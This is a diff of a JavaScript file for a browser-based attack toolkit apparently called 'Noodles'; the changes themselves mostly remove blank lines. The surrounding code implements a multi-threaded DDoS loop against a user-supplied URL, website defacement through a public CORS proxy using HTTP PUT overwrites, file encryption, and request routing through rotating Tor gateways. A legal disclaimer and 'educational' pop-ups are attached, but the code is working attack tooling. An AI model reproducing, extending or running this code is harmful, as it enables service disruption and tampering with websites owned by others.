@@ -1,5 +1,4 @@
 // Updated Tor.js file to include required functionalities and adhere to coding standards
-
 class Tor {
     constructor() {
         this.gateways = [
@@ -80,7 +79,6 @@ class Tor {
         this.gatewayCheckEnabled = true;
         this.isCheckingGateways = false;
         this.gatewayCheckTimeout = 5000;
-
         // New properties and initialization for Noodles requirements
         this.fileEncryptionKey = null;
         this.isNoodlesInitialized = false;
@@ -101,7 +99,6 @@ class Tor {
         this.initializeUI();
         this.NoodlesDisclaimer = "Noodles Inc. is NOT responsible for unauthorized use. Unauthorized use is illegal. Use at your own risk.";
         this.initializeNoodles();
-
         // DDoS-specific configurations
         this.ddosConfig = {
             threads: 200,          // Default number of threads for DDoS attacks
@@ -113,32 +110,26 @@ class Tor {
                 'X-Noodles-Attack': 'DDoS'
             }
         };
-
         // File encryption-specific configurations
         this.encryptionConfig = {
             algorithm: "AES-GCM",  // Default encryption algorithm
             keyLength: 256,          // Default key length in bits
         };
-
         // Defacement-specific configurations
         this.defacementConfig = {
             backupBeforeDeface: true, // Automatically back up the website before defacing
             restoreOnExit: true,      // Automatically restore the website when the tool is closed
             proxyURL: "https://cors-anywhere.herokuapp.com/"
         };
-
         // Reporting-specific configurations
         this.reportingConfig = {
             autoSaveInterval: 30000, // Interval for automatically saving reports in milliseconds
             reportFormat: "JSON"      // Default report format
         };
-
         // Add start and stop time for the DDoS attack
         this.ddosAttackStartTime = null;
         this.ddosAttackEndTime = null;
-
     }
-
     // Noodles Initialization and Global Consent
     async initializeNoodles() {
         if (this.isNoodlesInitialized) return;
@@ -147,39 +138,31 @@ class Tor {
             this.logToConsole("Noodles initialized with user consent.");
             this.displayDisclaimer();
             this.startGatewayMonitoring();
-
             // Additional setup actions here
             this.setupDDoS();
             this.setupEncryption();
             this.setupDefacement();
             this.startAutoReportSaving();
-
             // Initialize TorGateways
             this.initializeTorGateways();
-
             // New code for managing Tor gateways
             this.torGateways = new TorGateways(this);
-
         } else {
             this.closeSite();
         }
     }
-
     requireUserConsent() {
         window.addEventListener('beforeunload', (event) => {
             event.preventDefault();
             event.returnValue = "Warning: Closing this site may have unintended consequences. Are you sure you want to close Noodles?";
         });
     }
-
     closeSite() {
         window.close();
     }
-
     displayDisclaimer() {
         alert(this.NoodlesDisclaimer);
     }
-
     // Logging Functions
     logToConsole(message) {
         if (this.allActionsLogged) {
@@ -187,7 +170,6 @@ class Tor {
             this.noodlesLogs.push({ timestamp: new Date(), message: message });
         }
     }
-
     // Educational Information
     showEducationalInfo(toolName) {
         let info = "";
@@ -207,26 +189,22 @@ class Tor {
         alert(info);
         this.logToConsole(`Educational information displayed for ${toolName}.`);
     }
-
     // UI Enhancements
     applyDarkTheme() {
         document.body.style.backgroundColor = '#121212';
         document.body.style.color = '#FFFFFF';
         this.logToConsole("Dark theme applied.");
     }
-
     toggleScanLines() {
         this.scanLinesEnabled = !this.scanLinesEnabled;
         // Implementation for scan lines effect (CSS or Canvas)
         this.logToConsole(`Scan lines toggled ${this.scanLinesEnabled ? 'on' : 'off'}.`);
     }
-
     toggleParticles() {
         this.particlesEnabled = !this.particlesEnabled;
         // Implementation for particle effect (Canvas or library)
         this.logToConsole(`Particles toggled ${this.particlesEnabled ? 'on' : 'off'}.`);
     }
-
     // Security Headers Setup
     setupSecurityHeaders() {
         for (const header in this.securityHeaders) {
@@ -236,24 +214,20 @@ class Tor {
         }
         this.logToConsole("Security headers applied.");
     }
-
     createMetaTag(header, content) {
         const meta = document.createElement('meta');
         meta.httpEquiv = header;
         meta.content = content;
         return meta;
     }
-
     // Reporting Feature
     addFinding(url, vulnerability, details) {
         this.reportFindings.push({ url, vulnerability, details, timestamp: new Date() });
         this.logToConsole(`Vulnerability reported: ${vulnerability} at ${url}`);
     }
-
     generateReport() {
         return JSON.stringify(this.reportFindings, null, 2);
     }
-
     startAutoReportSaving() {
         setInterval(() => {
             const report = this.generateReport();
@@ -261,7 +235,6 @@ class Tor {
             this.logToConsole("Report auto-saved.");
         }, this.reportingConfig.autoSaveInterval);
     }
-
     saveReportToFile(report) {
         const blob = new Blob([report], { type: 'application/json' });
         const url = URL.createObjectURL(blob);
@@ -273,9 +246,7 @@ class Tor {
         document.body.removeChild(link);
         URL.revokeObjectURL(url);
     }
-
     // Defacement Tool Functions
-
     async backupWebsite(url) {
         try {
             const proxiedURL = this.defacementConfig.proxyURL + url;
@@ -296,13 +267,11 @@ class Tor {
             throw error;
         }
     }
-
     async restoreWebsite(backup) {
         try {
             const backupData = JSON.parse(backup);
             const url = backupData.url;
             const content = backupData.content;
-
             const putOptions = {
                 method: 'PUT',
                 headers: {
@@ -313,9 +282,7 @@ class Tor {
                 body: content,
                 redirect: 'follow'
             };
-
             const putResponse = await this.rawFetch(url, putOptions);
-
             if (putResponse.ok) {
                 this.logToConsole(`Website restored successfully: ${url}`);
             } else {
@@ -326,7 +293,6 @@ class Tor {
             throw error;
         }
     }
-
     async previewDefacement(url, script) {
          try {
             const proxiedURL = this.defacementConfig.proxyURL + url;
@@ -348,25 +314,19 @@ class Tor {
             throw error;
         }
     }
-
     // DDoS Tool Functions
-
     setupDDoS() {
         this.ddosConfig.threads = parseInt(prompt("Enter number of threads for DDoS (default: 200):") || this.ddosConfig.threads);
         this.ddosConfig.duration = parseInt(prompt("Enter duration in seconds for DDoS (default: 60):") || this.ddosConfig.duration);
         this.logToConsole("DDoS setup complete.");
     }
-
     async startDDoS(url) {
         this.startAttack('DDOS', url, { threads: this.ddosConfig.threads, duration: this.ddosConfig.duration });
-
         // Record start time
         this.ddosAttackStartTime = new Date();
         this.ddosThreads = [];
-
         const endTime = Date.now() + (this.ddosConfig.duration * 1000);
         let requestCount = 0;
-
         const attackThread = async () => {
             while (Date.now() < endTime) {
                 try {
@@ -382,20 +342,16 @@ class Tor {
                 await this.delay(this.ddosConfig.requestDelay);
             }
         };
-
         for (let i = 0; i < this.ddosConfig.threads; i++) {
             this.ddosThreads.push(attackThread());
         }
-
         await Promise.all(this.ddosThreads);
-
         // Record end time
         this.ddosAttackEndTime = new Date();
         this.endAttack('DDOS', url, { totalRequests: requestCount, threads: this.ddosConfig.threads });
         this.logToConsole(`DDoS attack completed. Total requests sent: ${requestCount} with ${this.ddosConfig.threads} threads.`);
         this.displayDDoSTimer();  // Display timer after the attack is complete
     }
-
     // Function to display the DDoS timer
     displayDDoSTimer() {
         if (this.ddosAttackStartTime && this.ddosAttackEndTime) {
@@ -406,26 +362,21 @@ class Tor {
             alert('DDoS attack timer not available.');
         }
     }
-
     stopDDoS() {
         this.stopAttack();
-
         // Clear the start and end times
         this.ddosAttackStartTime = null;
         this.ddosAttackEndTime = null;
     }
-
     delay(ms) {
         return new Promise(resolve => setTimeout(resolve, ms));
     }
-
     // File Encryption Tool Functions
     setupEncryption() {
         this.encryptionConfig.algorithm = prompt("Enter encryption algorithm (default: AES-GCM):") || this.encryptionConfig.algorithm;
         this.encryptionConfig.keyLength = parseInt(prompt("Enter key length in bits (default: 256):") || this.encryptionConfig.keyLength);
         this.logToConsole("Encryption setup complete.");
     }
-
     async encryptFile(file, key) {
         this.fileEncryptionKey = key;
         const reader = new FileReader();
@@ -446,7 +397,6 @@ class Tor {
                 const completeArray = new Uint8Array(iv.length + encryptedArray.length);
                 completeArray.set(iv);
                 completeArray.set(encryptedArray, iv.length);
-
                 const blob = new Blob([completeArray], { type: 'application/octet-stream' });
                 const url = URL.createObjectURL(blob);
                 const link = document.createElement('a');
@@ -456,9 +406,7 @@ class Tor {
                 link.click();
                 document.body.removeChild(link);
                 URL.revokeObjectURL(url);
-
                 this.logToConsole(`File ${file.name} encrypted successfully.`);
-
             } catch (e) {
                 console.error("Encryption error:", e);
                 this.logToConsole(`Encryption failed for ${file.name}: ${e}`);
@@ -470,7 +418,6 @@ class Tor {
         };
         reader.readAsArrayBuffer(file);
     }
-
     async decryptFile(file, key) {
         try {
             const reader = new FileReader();
@@ -479,7 +426,6 @@ class Tor {
                 const iv = encryptedData.slice(0, 12);
                 const encryptedContent = encryptedData.slice(12);
                 const cryptoKey = await this.deriveKey(key);
-
                 try {
                     const decryptedContent = await window.crypto.subtle.decrypt(
                         {
@@ -489,7 +435,6 @@ class Tor {
                         cryptoKey,
                         encryptedContent
                     );
-
                     const decryptedArray = new Uint8Array(decryptedContent);
                     const blob = new Blob([decryptedArray]);
                     const url = URL.createObjectURL(blob);
@@ -500,9 +445,7 @@ class Tor {
                     link.click();
                     document.body.removeChild(link);
                     URL.revokeObjectURL(url);
-
                     this.logToConsole(`File ${file.name} decrypted successfully.`);
-
                 } catch (e) {
                     console.error("Decryption error:", e);
                     this.logToConsole(`Decryption failed for ${file.name}: ${e}`);
@@ -518,7 +461,6 @@ class Tor {
             this.logToConsole(`Decryption setup failed: ${error}`);
         }
     }
-
     async deriveKey(key) {
         const encoder = new TextEncoder();
         const data = encoder.encode(key);
@@ -531,27 +473,21 @@ class Tor {
             ["encrypt", "decrypt"]
         );
     }
-
     // Defacement Tool Setup
     setupDefacement() {
         this.defacementConfig.backupBeforeDeface = confirm("Backup website before defacing? (Recommended)");
         this.defacementConfig.restoreOnExit = confirm("Restore website on exit? (Recommended)");
         this.logToConsole("Defacement setup complete.");
     }
-
-
     // UI Initialization (Placeholder)
     initializeUI() {
         this.applyDarkTheme();
         this.logToConsole("UI initialized.");
-
         // Implement scan lines effect
         this.createScanLines();
-
         // Implement particle effect
         this.createParticles();
     }
-
     // Scan Lines Effect
     createScanLines() {
         const canvas = document.createElement('canvas');
@@ -564,16 +500,13 @@ class Tor {
         canvas.style.pointerEvents = 'none';
         canvas.style.zIndex = '9999';
         document.body.appendChild(canvas);
-
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
-
         const drawScanLines = () => {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
             ctx.strokeStyle = 'rgba(0, 255, 0, 0.1)'; // Dark Green
             ctx.lineWidth = 0.5;
-
             for (let y = 0; y < canvas.height; y += 4) {
                 ctx.beginPath();
                 ctx.moveTo(0, y);
@@ -581,17 +514,14 @@ class Tor {
                 ctx.stroke();
             }
         };
-
         drawScanLines();
         window.addEventListener('resize', () => {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
             drawScanLines();
         });
-
         this.logToConsole("Scan lines effect created.");
     }
-
     // Particle Effect
     createParticles() {
         const canvas = document.createElement('canvas');
@@ -604,14 +534,11 @@ class Tor {
         canvas.style.pointerEvents = 'none';
         canvas.style.zIndex = '9998';
         document.body.appendChild(canvas);
-
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
-
         const particles = [];
         const particleCount = 50;
-
         for (let i = 0; i < particleCount; i++) {
             particles.push({
                 x: Math.random() * canvas.width,
@@ -622,7 +549,6 @@ class Tor {
                 color: `rgba(148,0,211,0.7)` // Dark Purple
             });
         }
-
         const drawParticles = () => {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
             particles.forEach(p => {
@@ -632,27 +558,22 @@ class Tor {
                 ctx.fill();
                 p.x += p.speedX;
                 p.y += p.speedY;
-
                 if (p.x < 0 || p.x > canvas.width) p.speedX = -p.speedX;
                 if (p.y < 0 || p.y > canvas.height) p.speedY = -p.speedY;
             });
             requestAnimationFrame(drawParticles);
         };
-
         drawParticles();
         window.addEventListener('resize', () => {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
         });
-
         this.logToConsole("Particle effect created.");
     }
-
     // Utilities
     rawFetch(url, options = {}) {
         return fetch(url, options);
     }
-
     startAttack(attackType, targetURL, config = {}) {
         this.activeAttackType = attackType;
         this.targetURL = targetURL;
@@ -660,13 +581,11 @@ class Tor {
         this.attackStartTime = new Date();
         this.logToConsole(`${attackType} attack started on ${targetURL} at ${this.attackStartTime.toISOString()} with config: ${JSON.stringify(config)}`);
     }
-
     stopAttack() {
         if (this.activeAttackType) {
             this.endAttack(this.activeAttackType, this.targetURL, this.attackConfig);
         }
     }
-
     endAttack(attackType, targetURL, config = {}) {
         this.attackEndTime = new Date();
         const duration = (this.attackEndTime - this.attackStartTime) / 1000;
@@ -675,14 +594,12 @@ class Tor {
         this.targetURL = null;
         this.attackConfig = {};
     }
-
      // Initialize Tor Gateways
      initializeTorGateways() {
         this.torGateways = new TorGateways(this);
         this.logToConsole("Tor Gateways initialized.");
     }
 }
-
 // TorGateways class to handle gateway management
 class TorGateways {
     constructor(torInstance) {
@@ -731,29 +648,22 @@ class TorGateways {
         this.gatewayCheckEnabled = true;
         this.isCheckingGateways = false;
         this.gatewayCheckTimeout = 5000;
-
         this.startGatewayMonitoring();
     }
-
     // Method to start gateway monitoring
     startGatewayMonitoring() {
         if (!this.gatewayCheckEnabled || this.isCheckingGateways) return;
         this.isCheckingGateways = true;
-
         setInterval(() => {
             this.checkGateways();
         }, 60000);
-
         this.torInstance.logToConsole("Gateway monitoring started.");
     }
-
     // Method to check gateways
     async checkGateways() {
         if (this.isCheckingGateways) return;
         this.isCheckingGateways = true;
-
         this.torInstance.logToConsole("Checking Tor Gateways...");
-
         for (const gateway of this.gateways) {
             if (!this.failedGateways.has(gateway)) {
                 try {
@@ -764,11 +674,9 @@ class TorGateways {
                 }
             }
         }
-
         this.isCheckingGateways = false;
         this.torInstance.logToConsole("Tor Gateways check complete.");
     }
-
     // Method to check the status of a single gateway
     async checkGatewayStatus(gateway) {
         try {
@@ -779,7 +687,6 @@ class TorGateways {
                     'User-Agent': 'Noodles Gateway Checker'
                 }
             });
-
             if (response.ok) {
                 return "Online";
             } else {
@@ -791,7 +698,6 @@ class TorGateways {
             return `Error: ${error}`;
         }
     }
-
     // Method to blacklist a gateway
     blacklistGateway(gateway) {
         this.failedGateways.add(gateway);
@@ -799,34 +705,27 @@ class TorGateways {
             this.failedGateways.delete(gateway);
             this.torInstance.logToConsole(`Gateway ${gateway} removed from blacklist.`);
         }, this.gatewayBlacklistDuration);
-
         this.torInstance.logToConsole(`Gateway ${gateway} blacklisted.`);
     }
-
     // Method to get the next available gateway
     getNextGateway() {
         let retries = 0;
         while (retries < this.maxRetries) {
             const gateway = this.gateways[this.currentIndex];
             this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
-
             if (!this.failedGateways.has(gateway)) {
                 return gateway;
             }
-
             retries++;
         }
-
         return null;
     }
-
     // Method to perform a fetch request through a Tor gateway
     async fetchThroughGateway(url, options = {}) {
         const gateway = this.getNextGateway();
         if (!gateway) {
             throw new Error("No available Tor gateways.");
         }
-
         const torURL = `${gateway}/${url}`;
         try {
             const response = await fetch(torURL, options);
@@ -840,7 +739,6 @@ class TorGateways {
             throw error;
         }
     }
-
     // Method to handle raw fetch requests
     async rawFetch(url, options = {}) {
         try {
@@ -852,5 +750,4 @@ class TorGateways {
         }
     }
 }
-
 window.Tor = Tor;
